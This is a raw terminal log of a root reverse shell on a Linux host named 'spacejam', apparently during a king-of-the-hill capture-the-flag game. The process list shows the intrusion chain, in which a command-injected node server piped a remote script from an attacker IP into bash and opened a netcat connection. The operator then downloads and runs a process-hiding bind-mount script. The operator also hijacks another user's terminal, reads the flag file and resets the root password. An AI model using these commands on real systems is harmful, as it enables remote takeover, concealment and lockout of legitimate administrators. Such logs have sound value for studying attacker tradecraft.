bash: cannot set terminal process group (1273): Inappropriate ioctl for device
bash: no job control in this shell
root@spacejam:/# ls
ls
bin
boot
dev
etc
home
initrd.img
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
sys
tmp
usr
var
vmlinuz
root@spacejam:/# w
w
 18:34:22 up 29 min,  1 user,  load average: 0.00, 0.03, 0.06
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
jordan   pts/0    10.2.66.237      18:19    1:02   0.07s  0.01s sshd: jordan [priv] 
root@spacejam:/# cat /dev/pts/0 > /dev/null &
cat /dev/pts/0 > /dev/null &
[1] 2399
root@spacejam:/# ps -efH
ps -efH
UID        PID  PPID  C STIME TTY          TIME CMD
root         2     0  0 18:04 ?        00:00:00 [kthreadd]
root         3     2  0 18:04 ?        00:00:00   [ksoftirqd/0]
root         5     2  0 18:04 ?        00:00:00   [kworker/0:0H]
root         7     2  0 18:04 ?        00:00:00   [rcu_sched]
root         8     2  0 18:04 ?        00:00:00   [rcu_bh]
root         9     2  0 18:04 ?        00:00:00   [migration/0]
root        10     2  0 18:04 ?        00:00:00   [watchdog/0]
root        11     2  0 18:04 ?        00:00:00   [kdevtmpfs]
root        12     2  0 18:04 ?        00:00:00   [netns]
root        13     2  0 18:04 ?        00:00:00   [perf]
root        14     2  0 18:04 ?        00:00:00   [xenwatch]
root        15     2  0 18:04 ?        00:00:00   [xenbus]
root        17     2  0 18:04 ?        00:00:00   [khungtaskd]
root        18     2  0 18:04 ?        00:00:00   [writeback]
root        19     2  0 18:04 ?        00:00:00   [ksmd]
root        20     2  0 18:04 ?        00:00:00   [khugepaged]
root        21     2  0 18:04 ?        00:00:00   [crypto]
root        22     2  0 18:04 ?        00:00:00   [kintegrityd]
root        23     2  0 18:04 ?        00:00:00   [bioset]
root        24     2  0 18:04 ?        00:00:00   [kblockd]
root        25     2  0 18:04 ?        00:00:00   [ata_sff]
root        26     2  0 18:04 ?        00:00:00   [md]
root        27     2  0 18:04 ?        00:00:00   [devfreq_wq]
root        28     2  0 18:04 ?        00:00:00   [kworker/u30:1]
root        30     2  0 18:04 ?        00:00:00   [kswapd0]
root        31     2  0 18:04 ?        00:00:00   [vmstat]
root        32     2  0 18:04 ?        00:00:00   [fsnotify_mark]
root        33     2  0 18:04 ?        00:00:00   [ecryptfs-kthrea]
root        49     2  0 18:04 ?        00:00:00   [kthrotld]
root        50     2  0 18:05 ?        00:00:00   [acpi_thermal_pm]
root        51     2  0 18:05 ?        00:00:00   [bioset]
root        52     2  0 18:05 ?        00:00:00   [bioset]
root        53     2  0 18:05 ?        00:00:00   [bioset]
root        54     2  0 18:05 ?        00:00:00   [bioset]
root        55     2  0 18:05 ?        00:00:00   [bioset]
root        56     2  0 18:05 ?        00:00:00   [bioset]
root        57     2  0 18:05 ?        00:00:00   [bioset]
root        58     2  0 18:05 ?        00:00:00   [bioset]
root        59     2  0 18:05 ?        00:00:00   [scsi_eh_0]
root        60     2  0 18:05 ?        00:00:00   [scsi_tmf_0]
root        61     2  0 18:05 ?        00:00:00   [scsi_eh_1]
root        62     2  0 18:05 ?        00:00:00   [scsi_tmf_1]
root        64     2  0 18:05 ?        00:00:00   [bioset]
root        69     2  0 18:05 ?        00:00:00   [ipv6_addrconf]
root        82     2  0 18:05 ?        00:00:00   [bioset]
root        83     2  0 18:05 ?        00:00:00   [deferwq]
root        84     2  0 18:05 ?        00:00:00   [charger_manager]
root       122     2  0 18:05 ?        00:00:00   [bioset]
root       123     2  0 18:05 ?        00:00:00   [bioset]
root       124     2  0 18:05 ?        00:00:00   [bioset]
root       125     2  0 18:05 ?        00:00:00   [bioset]
root       126     2  0 18:05 ?        00:00:00   [bioset]
root       127     2  0 18:05 ?        00:00:00   [bioset]
root       128     2  0 18:05 ?        00:00:00   [bioset]
root       129     2  0 18:05 ?        00:00:00   [bioset]
root       130     2  0 18:05 ?        00:00:00   [kpsmoused]
root       150     2  0 18:05 ?        00:00:00   [ttm_swap]
root       223     2  0 18:05 ?        00:00:00   [kworker/0:1H]
root       231     2  0 18:05 ?        00:00:00   [raid5wq]
root       257     2  0 18:05 ?        00:00:00   [bioset]
root       286     2  0 18:05 ?        00:00:00   [jbd2/xvda1-8]
root       287     2  0 18:05 ?        00:00:00   [ext4-rsv-conver]
root       339     2  0 18:05 ?        00:00:00   [kworker/0:3]
root       370     2  0 18:05 ?        00:00:00   [kauditd]
root       391     2  0 18:05 ?        00:00:00   [iscsi_eh]
root       409     2  0 18:05 ?        00:00:00   [ib_addr]
root       420     2  0 18:05 ?        00:00:00   [ib_mcast]
root       421     2  0 18:05 ?        00:00:00   [ib_nl_sa_wq]
root       422     2  0 18:05 ?        00:00:00   [ib_cm]
root       423     2  0 18:05 ?        00:00:00   [iw_cm_wq]
root       424     2  0 18:05 ?        00:00:00   [rdma_cm]
root      1958     2  0 18:24 ?        00:00:00   [kworker/u30:2]
root      1965     2  0 18:24 ?        00:00:00   [kworker/0:1]
root      2180     2  0 18:30 ?        00:00:00   [kworker/0:0]
root         1     0  0 18:04 ?        00:00:10 /sbin/init
root       337     1  0 18:05 ?        00:00:00   /lib/systemd/systemd-journald
root       387     1  0 18:05 ?        00:00:00   /sbin/lvmetad -f
root       417     1  0 18:05 ?        00:00:00   /lib/systemd/systemd-udevd
systemd+   498     1  0 18:05 ?        00:00:00   /lib/systemd/systemd-timesyncd
root       727     1  0 18:05 ?        00:00:00   /sbin/dhclient -1 -v -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
root       884     1  0 18:05 ?        00:00:00   /sbin/iscsid
root       885     1  0 18:05 ?        00:00:00   /sbin/iscsid
root       888     1  0 18:05 ?        00:00:00   /usr/sbin/inetd -i
message+   891     1  0 18:05 ?        00:00:00   /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
jordan     894     1  0 18:05 ?        00:00:00   python3 /home/jordan/easyaccess.py
root       907     1  0 18:05 ?        00:00:00   /bin/koth
syslog     917     1  0 18:05 ?        00:00:00   /usr/sbin/rsyslogd -n
root       924     1  0 18:05 ?        00:00:00   /usr/sbin/acpid
daemon     927     1  0 18:05 ?        00:00:00   /usr/sbin/atd -f
root       930     1  0 18:05 ?        00:00:01   /usr/bin/lxcfs /var/lib/lxcfs/
root       940     1  0 18:05 ?        00:00:00   /usr/sbin/cron -f
root       947     1  0 18:05 ?        00:00:00   /usr/lib/accountsservice/accounts-daemon
root       953     1  0 18:05 ?        00:00:00   /lib/systemd/systemd-logind
root       956     1  0 18:05 ?        00:00:00   /usr/lib/snapd/snapd
root       971     1  0 18:05 ?        00:00:00   /sbin/mdadm --monitor --pid-file /run/mdadm/monitor.pid --daemonise --scan --syslog
root      1065     1  0 18:05 ttyS0    00:00:00   /sbin/agetty --keep-baud 115200 38400 9600 ttyS0 vt220
root      1067     1  0 18:05 tty1     00:00:00   /sbin/agetty --noclear tty1 linux
root      1077     1  0 18:05 ?        00:00:00   /usr/sbin/sshd -D
root      1685  1077  0 18:19 ?        00:00:00     sshd: jordan [priv]
jordan    1748  1685  0 18:19 ?        00:00:00       sshd: jordan@pts/0
jordan    1754  1748  0 18:19 pts/0    00:00:00         -bash
root      1770  1754  0 18:19 pts/0    00:00:00           su
root      1771  1770  0 18:19 pts/0    00:00:00             bash
mysql     1083     1  0 18:05 ?        00:00:00   /usr/sbin/mysqld
root      1094     1  0 18:05 ?        00:00:00   /usr/lib/policykit-1/polkitd --no-debug
root      1129     1  0 18:05 ?        00:00:00   /usr/sbin/apache2 -k start
jordan    1185  1129  0 18:05 ?        00:00:00     /usr/sbin/apache2 -k start
jordan    1188  1129  0 18:05 ?        00:00:00     /usr/sbin/apache2 -k start
jordan    1316  1129  0 18:06 ?        00:00:00     /usr/sbin/apache2 -k start
jordan    1374  1129  0 18:08 ?        00:00:00     /usr/sbin/apache2 -k start
jordan    1477  1129  0 18:11 ?        00:00:00     /usr/sbin/apache2 -k start
jordan    1504  1129  0 18:13 ?        00:00:00     /usr/sbin/apache2 -k start
jordan    1537  1129  0 18:14 ?        00:00:00     /usr/sbin/apache2 -k start
jordan    1538  1129  0 18:14 ?        00:00:00     /usr/sbin/apache2 -k start
jordan    1539  1129  0 18:14 ?        00:00:00     /usr/sbin/apache2 -k start
jordan    1658  1129  0 18:16 ?        00:00:00     /usr/sbin/apache2 -k start
postgres  1143     1  0 18:05 ?        00:00:00   /usr/lib/postgresql/9.3/bin/postgres -D /var/lib/postgresql/9.3/main -c config_file=/etc/postgresql/9.3/main/postgresql.conf
postgres  1169  1143  0 18:05 ?        00:00:00     postgres: checkpointer process   
postgres  1170  1143  0 18:05 ?        00:00:00     postgres: writer process   
postgres  1171  1143  0 18:05 ?        00:00:00     postgres: wal writer process   
postgres  1172  1143  0 18:05 ?        00:00:00     postgres: autovacuum launcher process   
postgres  1173  1143  0 18:05 ?        00:00:00     postgres: stats collector process   
root      1273     1  0 18:05 ?        00:00:00   /usr/bin/node /usr/lib/node_modules/forever/bin/monitor /home/bunny/simple-command-injection/server.js
root      1284  1273  0 18:05 ?        00:00:00     /usr/bin/node /home/bunny/simple-command-injection/server.js
root      2364  1284  0 18:34 ?        00:00:00       /bin/sh -c curl http://10.6.34.207:8000/rev.sh | /bin/bash
root      2366  2364  0 18:34 ?        00:00:00         /bin/bash
root      2369  2366  0 18:34 ?        00:00:00           cat /tmp/.thm-jitter
root      2370  2366  0 18:34 ?        00:00:00           /bin/bash -i
root      2399  2370  0 18:34 ?        00:00:00             cat /dev/pts/0
root      2405  2370  0 18:34 ?        00:00:00             ps -efH
root      2371  2366  0 18:34 ?        00:00:00           nc 10.6.34.207 32214
root      1488     1  0 18:12 ?        00:00:00   /usr/bin/systemd-pam
root      1525     1  0 18:14 ?        00:00:00   /usr/lib/snapd/snapd
jordan    1687     1  0 18:19 ?        00:00:00   /lib/systemd/systemd --user
jordan    1689  1687  0 18:19 ?        00:00:00     (sd-pam)
root@spacejam:/# curl http://10.6.34.207:8000/loopedtheory.sh /tmp/.loth.sh
curl http://10.6.34.207:8000/loopedtheory.sh /tmp/.loth.sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed

  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
100   721  100   721    0     0   3896      0 --:--:-- --:--:-- --:--:--  3918
#!/bin/bash
opcode="$1"
tgt="$2"

if [ "$opcode" == "-hide" ]; then
	##HIDE FOLDER
	mkdir -p /tmp/...
	mount -o bind /tmp/... $tgt 2> /dev/null || sudo mount -o bind /tmp/... $tgt
elif [ "$opcode" == "-cloak" ]; then
	##CLOAK FOLDER; Will copy, allow changes, then mount as a RO filesystem
	echo "Make sure you are root..."; sleep 2;
	tempdir="/tmp/.$tgt"
	resting="$tgt/..."
	rm -rf "$resting"
	rm -rf "$tempdir"
	cp -r -p "$tgt" "$tempdir"
	read -p "Working dir: ($tempdir); Press enter when ready..."
	cp -r -p "$tempdir" "$resting"
	rm -rf "$tempdir"
	mount -o bind,ro "$resting" "$tgt"

elif [ "$opcode" == "-uncloak" ]; then
	##UNCLOAK
	resting="$tgt/..."
	umount -l "$tgt"
	rm -rf "$resting"
fi

##Copy everything
curl: (3) <url> malformed
root@spacejam:/# curl http://10.6.34.207:8000/loopedtheory.sh > /tmp/.loth.sh
curl http://10.6.34.207:8000/loopedtheory.sh > /tmp/.loth.sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed

  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
100   721  100   721    0     0   3929      0 --:--:-- --:--:-- --:--:--  3939
root@spacejam:/# cd /tmp
cd /tmp
root@spacejam:/tmp# echo $$
echo $$
2370
root@spacejam:/tmp# ./.loth.sh -hide /proc/2370
./.loth.sh -hide /proc/2370
mount: wrong fs type, bad option, bad superblock on /tmp/...,
       missing codepage or helper program, or other error

       In some cases useful info is found in syslog - try
       dmesg | tail or so.
root@spacejam:/tmp# ls /root
ls /root
king.txt
root.txt
root@spacejam:/tmp# cat /root/king
cat /root/king
cat: /root/king: No such file or directory
root@spacejam:/tmp# cat /root/king.txt
cat /root/king.txt
M3chanical
root@spacejam:/tmp# passwd
passwd
Enter new UNIX password: staff
Retype new UNIX password: staff
passwd: password updated successfully
root@spacejam:/tmp# mount
mount
sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
udev on /dev type devtmpfs (rw,nosuid,relatime,size=485952k,nr_inodes=121488,mode=755)
devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=000)
tmpfs on /run type tmpfs (rw,nosuid,noexec,relatime,size=101408k,mode=755)
/dev/xvda1 on / type ext4 (rw,relatime,errors=remount-ro,data=ordered)
securityfs on /sys/kernel/security type securityfs (rw,nosuid,nodev,noexec,relatime)
tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev)
tmpfs on /run/lock type tmpfs (rw,nosuid,nodev,noexec,relatime,size=5120k)
tmpfs on /sys/fs/cgroup type tmpfs (ro,nosuid,nodev,noexec,mode=755)
cgroup on /sys/fs/cgroup/systemd type cgroup (rw,nosuid,nodev,noexec,relatime,xattr,release_agent=/lib/systemd/systemd-cgroups-agent,name=systemd)
pstore on /sys/fs/pstore type pstore (rw,nosuid,nodev,noexec,relatime)
cgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup (rw,nosuid,nodev,noexec,relatime,cpu,cpuacct)
cgroup on /sys/fs/cgroup/memory type cgroup (rw,nosuid,nodev,noexec,relatime,memory)
cgroup on /sys/fs/cgroup/hugetlb type cgroup (rw,nosuid,nodev,noexec,relatime,hugetlb)
cgroup on /sys/fs/cgroup/net_cls,net_prio type cgroup (rw,nosuid,nodev,noexec,relatime,net_cls,net_prio)
cgroup on /sys/fs/cgroup/blkio type cgroup (rw,nosuid,nodev,noexec,relatime,blkio)
cgroup on /sys/fs/cgroup/perf_event type cgroup (rw,nosuid,nodev,noexec,relatime,perf_event)
cgroup on /sys/fs/cgroup/devices type cgroup (rw,nosuid,nodev,noexec,relatime,devices)
cgroup on /sys/fs/cgroup/cpuset type cgroup (rw,nosuid,nodev,noexec,relatime,cpuset)
cgroup on /sys/fs/cgroup/pids type cgroup (rw,nosuid,nodev,noexec,relatime,pids)
cgroup on /sys/fs/cgroup/freezer type cgroup (rw,nosuid,nodev,noexec,relatime,freezer)
systemd-1 on /proc/sys/fs/binfmt_misc type autofs (rw,relatime,fd=38,pgrp=1,timeout=0,minproto=5,maxproto=5,direct)
hugetlbfs on /dev/hugepages type hugetlbfs (rw,relatime)
debugfs on /sys/kernel/debug type debugfs (rw,relatime)
mqueue on /dev/mqueue type mqueue (rw,relatime)
fusectl on /sys/fs/fuse/connections type fusectl (rw,relatime)
lxcfs on /var/lib/lxcfs type fuse.lxcfs (rw,nosuid,nodev,relatime,user_id=0,group_id=0,allow_other)
tmpfs on /run/user/1000 type tmpfs (rw,nosuid,nodev,relatime,size=101408k,mode=700,uid=1000,gid=1000)
tracefs on /sys/kernel/debug/tracing type tracefs (rw,relatime)
root@spacejam:/tmp# mount
mount
sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
udev on /dev type devtmpfs (rw,nosuid,relatime,size=485952k,nr_inodes=121488,mode=755)
devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=000)
tmpfs on /run type tmpfs (rw,nosuid,noexec,relatime,size=101408k,mode=755)
/dev/xvda1 on / type ext4 (rw,relatime,errors=remount-ro,data=ordered)
securityfs on /sys/kernel/security type securityfs (rw,nosuid,nodev,noexec,relatime)
tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev)
tmpfs on /run/lock type tmpfs (rw,nosuid,nodev,noexec,relatime,size=5120k)
tmpfs on /sys/fs/cgroup type tmpfs (ro,nosuid,nodev,noexec,mode=755)
cgroup on /sys/fs/cgroup/systemd type cgroup (rw,nosuid,nodev,noexec,relatime,xattr,release_agent=/lib/systemd/systemd-cgroups-agent,name=systemd)
pstore on /sys/fs/pstore type pstore (rw,nosuid,nodev,noexec,relatime)
cgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup (rw,nosuid,nodev,noexec,relatime,cpu,cpuacct)
cgroup on /sys/fs/cgroup/memory type cgroup (rw,nosuid,nodev,noexec,relatime,memory)
cgroup on /sys/fs/cgroup/hugetlb type cgroup (rw,nosuid,nodev,noexec,relatime,hugetlb)
cgroup on /sys/fs/cgroup/net_cls,net_prio type cgroup (rw,nosuid,nodev,noexec,relatime,net_cls,net_prio)
cgroup on /sys/fs/cgroup/blkio type cgroup (rw,nosuid,nodev,noexec,relatime,blkio)
cgroup on /sys/fs/cgroup/perf_event type cgroup (rw,nosuid,nodev,noexec,relatime,perf_event)
cgroup on /sys/fs/cgroup/devices type cgroup (rw,nosuid,nodev,noexec,relatime,devices)
cgroup on /sys/fs/cgroup/cpuset type cgroup (rw,nosuid,nodev,noexec,relatime,cpuset)
cgroup on /sys/fs/cgroup/pids type cgroup (rw,nosuid,nodev,noexec,relatime,pids)
cgroup on /sys/fs/cgroup/freezer type cgroup (rw,nosuid,nodev,noexec,relatime,freezer)
systemd-1 on /proc/sys/fs/binfmt_misc type autofs (rw,relatime,fd=38,pgrp=1,timeout=0,minproto=5,maxproto=5,direct)
hugetlbfs on /dev/hugepages type hugetlbfs (rw,relatime)
debugfs on /sys/kernel/debug type debugfs (rw,relatime)
mqueue on /dev/mqueue type mqueue (rw,relatime)
fusectl on /sys/fs/fuse/connections type fusectl (rw,relatime)
lxcfs on /var/lib/lxcfs type fuse.lxcfs (rw,nosuid,nodev,relatime,user_id=0,group_id=0,allow_other)
tmpfs on /run/user/1000 type tmpfs (rw,nosuid,nodev,relatime,size=101408k,mode=700,uid=1000,gid=1000)
tracefs on /sys/kernel/debug/tracing type tracefs (rw,relatime)
root@spacejam:/tmp# cat: /dev/pts/0: Resource temporarily unavailable


root@spacejam:/tmp# ps
ps
  PID TTY          TIME CMD
    1 ?        00:00:10 systemd
    2 ?        00:00:00 kthreadd
    3 ?        00:00:00 ksoftirqd/0
    5 ?        00:00:00 kworker/0:0H
    7 ?        00:00:00 rcu_sched
    8 ?        00:00:00 rcu_bh
    9 ?        00:00:00 migration/0
   10 ?        00:00:00 watchdog/0
   11 ?        00:00:00 kdevtmpfs
   12 ?        00:00:00 netns
   13 ?        00:00:00 perf
   14 ?        00:00:00 xenwatch
   15 ?        00:00:00 xenbus
   17 ?        00:00:00 khungtaskd
   18 ?        00:00:00 writeback
   19 ?        00:00:00 ksmd
   20 ?        00:00:00 khugepaged
   21 ?        00:00:00 crypto
   22 ?        00:00:00 kintegrityd
   23 ?        00:00:00 bioset
   24 ?        00:00:00 kblockd
   25 ?        00:00:00 ata_sff
   26 ?        00:00:00 md
   27 ?        00:00:00 devfreq_wq
   28 ?        00:00:00 kworker/u30:1
   30 ?        00:00:00 kswapd0
   31 ?        00:00:00 vmstat
   32 ?        00:00:00 fsnotify_mark
   33 ?        00:00:00 ecryptfs-kthrea
   49 ?        00:00:00 kthrotld
   50 ?        00:00:00 acpi_thermal_pm
   51 ?        00:00:00 bioset
   52 ?        00:00:00 bioset
   53 ?        00:00:00 bioset
   54 ?        00:00:00 bioset
   55 ?        00:00:00 bioset
   56 ?        00:00:00 bioset
   57 ?        00:00:00 bioset
   58 ?        00:00:00 bioset
   59 ?        00:00:00 scsi_eh_0
   60 ?        00:00:00 scsi_tmf_0
   61 ?        00:00:00 scsi_eh_1
   62 ?        00:00:00 scsi_tmf_1
   64 ?        00:00:00 bioset
   69 ?        00:00:00 ipv6_addrconf
   82 ?        00:00:00 bioset
   83 ?        00:00:00 deferwq
   84 ?        00:00:00 charger_manager
  122 ?        00:00:00 bioset
  123 ?        00:00:00 bioset
  124 ?        00:00:00 bioset
  125 ?        00:00:00 bioset
  126 ?        00:00:00 bioset
  127 ?        00:00:00 bioset
  128 ?        00:00:00 bioset
  129 ?        00:00:00 bioset
  130 ?        00:00:00 kpsmoused
  150 ?        00:00:00 ttm_swap
  223 ?        00:00:00 kworker/0:1H
  231 ?        00:00:00 raid5wq
  257 ?        00:00:00 bioset
  286 ?        00:00:00 jbd2/xvda1-8
  287 ?        00:00:00 ext4-rsv-conver
  337 ?        00:00:00 systemd-journal
  370 ?        00:00:00 kauditd
  387 ?        00:00:00 lvmetad
  391 ?        00:00:00 iscsi_eh
  409 ?        00:00:00 ib_addr
  417 ?        00:00:00 systemd-udevd
  420 ?        00:00:00 ib_mcast
  421 ?        00:00:00 ib_nl_sa_wq
  422 ?        00:00:00 ib_cm
  423 ?        00:00:00 iw_cm_wq
  424 ?        00:00:00 rdma_cm
  727 ?        00:00:00 dhclient
  884 ?        00:00:00 iscsid
  885 ?        00:00:00 iscsid
  888 ?        00:00:00 inetd
  907 ?        00:00:00 koth
  924 ?        00:00:00 acpid
  930 ?        00:00:01 lxcfs
  940 ?        00:00:00 cron
  947 ?        00:00:00 accounts-daemon
  953 ?        00:00:00 systemd-logind
  956 ?        00:00:00 snapd
  971 ?        00:00:00 mdadm
 1077 ?        00:00:00 sshd
 1094 ?        00:00:00 polkitd
 1129 ?        00:00:00 apache2
 1273 ?        00:00:00 node
 1284 ?        00:00:00 node
 1488 ?        00:00:00 systemd-pam
 1525 ?        00:00:00 .pulse-shm
 1958 ?        00:00:00 kworker/u30:2
 1965 ?        00:00:00 kworker/0:1
 2180 ?        00:00:00 kworker/0:0
 2364 ?        00:00:00 sh
 2366 ?        00:00:00 bash
 2369 ?        00:00:00 cat
 2370 ?        00:00:00 bash
 2371 ?        00:00:00 nc
 2481 ?        00:00:00 kworker/0:2
 2564 ?        00:00:00 sh
 2565 ?        00:00:00 rsyslog
 2632 ?        00:00:00 kworker/0:3
 2634 ?        00:00:00 kworker/0:4
 2636 ?        00:00:00 sh
 2641 ?        00:00:00 ps
root@spacejam:/tmp# which mount
which mount
/bin/mount
root@spacejam:/tmp# ls -l /bin/mount
ls -l /bin/mount
-rwsr-xr-x 1 root root 40152 May 16  2018 /bin/mount
root@spacejam:/tmp# ls -la /bin | grep mount
ls -la /bin | grep mount
-rwsr-xr-x  1 root root   30800 Jul 12  2016 fusermount
-rwsr-xr-x  1 root root   40152 May 16  2018 mount
-rwxr-xr-x  1 root root   14768 May 16  2018 mountpoint
-rwsr-xr-x  1 root root   27608 May 16  2018 umount
root@spacejam:/tmp# ls
ls
disk
systemd-private-08d4a4d83a03493cbbe077fdeb9def85-systemd-timesyncd.service-QX8SbO
root@spacejam:/tmp# ls -l
ls -l
total 8
drwxr-xr-x 2 root root 4096 Nov 29 18:45 disk
drwx------ 3 root root 4096 Nov 29 18:05 systemd-private-08d4a4d83a03493cbbe077fdeb9def85-systemd-timesyncd.service-QX8SbO
root@spacejam:/tmp# ls -la
ls -la
total 56
drwxrwxrwt 13 root root 4096 Nov 29 18:47 .
drwxr-xr-x 23 root root 4096 Nov 29 18:46 ..
drwxr-xr-x  2 root root 4096 Nov 29 18:38 ...
drwxr-xr-x  2 root root 4096 Nov 29 18:45 disk
drwxrwxrwt  2 root root 4096 Nov 29 18:05 .font-unix
drwxrwxrwt  2 root root 4096 Nov 29 18:05 .ICE-unix
---x-----t  1 root root  721 Nov 29 18:37 .loth.sh
drwxr-xr-x  2 root root 4096 Nov 29 18:47 .mp
drwx------  3 root root 4096 Nov 29 18:05 systemd-private-08d4a4d83a03493cbbe077fdeb9def85-systemd-timesyncd.service-QX8SbO
drwxrwxrwt  2 root root 4096 Nov 29 18:05 .Test-unix
prw-r--r--  1 root root    0 Nov 29 18:47 .thm-jitter
drwxr-xr-x  2 root root 4096 Nov 29 18:45 .ump
drwxr-xr-x  2 root root 4096 Nov 29 18:33 .X0-lock
drwxrwxrwt  2 root root 4096 Nov 29 18:05 .X11-unix
drwxrwxrwt  2 root root 4096 Nov 29 18:05 .XIM-unix
root@spacejam:/tmp# cd .ump
cd .ump
root@spacejam:/tmp/.ump# ls
ls
root@spacejam:/tmp/.ump# ls -a
ls -a
.
..
root@spacejam:/tmp/.ump# ls -a /tmp/.mp
ls -a /tmp/.mp
.
..
pull.sh
root@spacejam:/tmp/.ump# ls -a /tmp/disk
ls -a /tmp/disk
.
..
disk.tar.pull.enc
root@spacejam:/tmp/.ump# cat /etc/ssh
cat /etc/ssh
cat: /etc/ssh: Is a directory
root@spacejam:/tmp/.ump# cat /etc/ssh/sshd_config
cat /etc/ssh/sshd_config
# Package generated configuration file
# See the sshd_config(5) manpage for details

# What ports, IPs and protocols we listen for
Port 22
# Use these options to restrict which interfaces/protocols sshd will bind to
#ListenAddress ::
#ListenAddress 0.0.0.0
Protocol 2
# HostKeys for protocol version 2
HostKey /etc/ssh/ssh_host_rsa_key
HostKey /etc/ssh/ssh_host_dsa_key
HostKey /etc/ssh/ssh_host_ecdsa_key
HostKey /etc/ssh/ssh_host_ed25519_key
#Privilege Separation is turned on for security
UsePrivilegeSeparation yes

# Lifetime and size of ephemeral version 1 server key
KeyRegenerationInterval 3600
ServerKeyBits 1024

# Logging
SyslogFacility AUTH
LogLevel INFO

# Authentication:
LoginGraceTime 120
PermitRootLogin yes
StrictModes yes

RSAAuthentication yes
PubkeyAuthentication yes
#AuthorizedKeysFile	%h/.ssh/authorized_keys

# Don't read the user's ~/.rhosts and ~/.shosts files
IgnoreRhosts yes
# For this to work you will also need host keys in /etc/ssh_known_hosts
RhostsRSAAuthentication no
# similar for protocol version 2
HostbasedAuthentication no
# Uncomment if you don't trust ~/.ssh/known_hosts for RhostsRSAAuthentication
#IgnoreUserKnownHosts yes

# To enable empty passwords, change to yes (NOT RECOMMENDED)
PermitEmptyPasswords no

# Change to yes to enable challenge-response passwords (beware issues with
# some PAM modules and threads)
ChallengeResponseAuthentication no

# Change to no to disable tunnelled clear text passwords
#PasswordAuthentication yes

# Kerberos options
#KerberosAuthentication no
#KerberosGetAFSToken no
#KerberosOrLocalPasswd yes
#KerberosTicketCleanup yes

# GSSAPI options
#GSSAPIAuthentication no
#GSSAPICleanupCredentials yes

X11Forwarding yes
X11DisplayOffset 10
PrintMotd no
PrintLastLog yes
TCPKeepAlive yes
#UseLogin no

#MaxStartups 10:30:60
#Banner /etc/issue.net

# Allow client to pass locale environment variables
AcceptEnv LANG LC_*

Subsystem sftp /usr/lib/openssh/sftp-server

# Set this to 'yes' to enable PAM authentication, account processing,
# and session processing. If this is enabled, PAM authentication will
# be allowed through the ChallengeResponseAuthentication and
# PasswordAuthentication.  Depending on your PAM configuration,
# PAM authentication via ChallengeResponseAuthentication may bypass
# the setting of "PermitRootLogin without-password".
# If you just want the PAM account and session checks to run without
# PAM authentication, then enable this but set PasswordAuthentication
# and ChallengeResponseAuthentication to 'no'.
UsePAM yes
root@spacejam:/tmp/.ump# ls
ls
root@spacejam:/tmp/.ump# w
w
 18:59:17 up 54 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
root@spacejam:/tmp/.ump# ps -efH
ps -efH
UID        PID  PPID  C STIME TTY          TIME CMD
root         2     0  0 18:04 ?        00:00:00 [kthreadd]
root         3     2  0 18:04 ?        00:00:00   [ksoftirqd/0]
root         5     2  0 18:04 ?        00:00:00   [kworker/0:0H]
root         7     2  0 18:04 ?        00:00:00   [rcu_sched]
root         8     2  0 18:04 ?        00:00:00   [rcu_bh]
root         9     2  0 18:04 ?        00:00:00   [migration/0]
root        10     2  0 18:04 ?        00:00:00   [watchdog/0]
root        11     2  0 18:04 ?        00:00:00   [kdevtmpfs]
root        12     2  0 18:04 ?        00:00:00   [netns]
root        13     2  0 18:04 ?        00:00:00   [perf]
root        14     2  0 18:04 ?        00:00:00   [xenwatch]
root        15     2  0 18:04 ?        00:00:00   [xenbus]
root        17     2  0 18:04 ?        00:00:00   [khungtaskd]
root        18     2  0 18:04 ?        00:00:00   [writeback]
root        19     2  0 18:04 ?        00:00:00   [ksmd]
root        20     2  0 18:04 ?        00:00:00   [khugepaged]
root        21     2  0 18:04 ?        00:00:00   [crypto]
root        22     2  0 18:04 ?        00:00:00   [kintegrityd]
root        23     2  0 18:04 ?        00:00:00   [bioset]
root        24     2  0 18:04 ?        00:00:00   [kblockd]
root        25     2  0 18:04 ?        00:00:00   [ata_sff]
root        26     2  0 18:04 ?        00:00:00   [md]
root        27     2  0 18:04 ?        00:00:00   [devfreq_wq]
root        28     2  0 18:04 ?        00:00:00   [kworker/u30:1]
root        30     2  0 18:04 ?        00:00:00   [kswapd0]
root        31     2  0 18:04 ?        00:00:00   [vmstat]
root        32     2  0 18:04 ?        00:00:00   [fsnotify_mark]
root        33     2  0 18:04 ?        00:00:00   [ecryptfs-kthrea]
root        49     2  0 18:04 ?        00:00:00   [kthrotld]
root        50     2  0 18:05 ?        00:00:00   [acpi_thermal_pm]
root        51     2  0 18:05 ?        00:00:00   [bioset]
root        52     2  0 18:05 ?        00:00:00   [bioset]
root        53     2  0 18:05 ?        00:00:00   [bioset]
root        54     2  0 18:05 ?        00:00:00   [bioset]
root        55     2  0 18:05 ?        00:00:00   [bioset]
root        56     2  0 18:05 ?        00:00:00   [bioset]
root        57     2  0 18:05 ?        00:00:00   [bioset]
root        58     2  0 18:05 ?        00:00:00   [bioset]
root        59     2  0 18:05 ?        00:00:00   [scsi_eh_0]
root        60     2  0 18:05 ?        00:00:00   [scsi_tmf_0]
root        61     2  0 18:05 ?        00:00:00   [scsi_eh_1]
